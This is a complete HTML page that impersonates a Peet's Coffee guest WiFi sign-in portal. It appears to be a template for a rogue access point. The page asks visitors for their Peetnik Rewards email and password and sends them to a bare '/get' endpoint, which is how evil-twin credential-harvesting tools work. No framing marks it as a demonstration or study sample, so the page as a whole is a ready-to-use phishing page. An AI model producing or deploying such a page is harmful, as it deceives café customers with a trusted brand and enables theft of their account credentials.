<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Peet's Coffee WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#2C1810;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 12px 50px rgba(0,0,0,0.4)}
.top{background:#2C1810;padding:28px 24px 20px;text-align:center}
.brand{font-size:24px;font-weight:700;color:#C8A46E;letter-spacing:3px;text-transform:uppercase;font-family:"Garamond","Times New Roman",Georgia,serif}
.tagline{font-size:9px;color:rgba(200,164,110,0.6);letter-spacing:3px;text-transform:uppercase;margin-top:6px}
.mid{background:#1f1008;padding:8px 24px;display:flex;align-items:center;gap:8px;border-top:1px solid #3a2010;border-bottom:1px solid #3a2010}
.dot{width:6px;height:6px;background:#C8A46E;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:#6a5040}
.mid strong{color:#C8A46E;font-weight:500}
.body{padding:24px}
h2{font-size:17px;font-weight:700;color:#2C1810;margin-bottom:3px;font-family:"Garamond","Times New Roman",Georgia,serif}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e8e0d0;border-radius:4px;font-size:14.5px;background:#fdfaf6;color:#1a1a1a;font-family:inherit}
input:focus{outline:none;border-color:#2C1810}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:4px;background:#2C1810;color:#C8A46E;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;font-family:inherit}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#2C1810}
.foot{background:#fdfaf6;border-top:1px solid #e8e0d0;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#2C1810}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brand">Peet's Coffee</div>
    <div class="tagline">Superior Coffee Since 1966</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>Peets_Guest_WiFi</strong></span></div>
  <div class="body">
    <h2>Guest WiFi Access</h2>
    <p class="sub">Sign in with your Peetnik Rewards account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Peet's Coffee &amp; Tea</span><a href="#">Help</a></div>
</div>
</body>
</html>
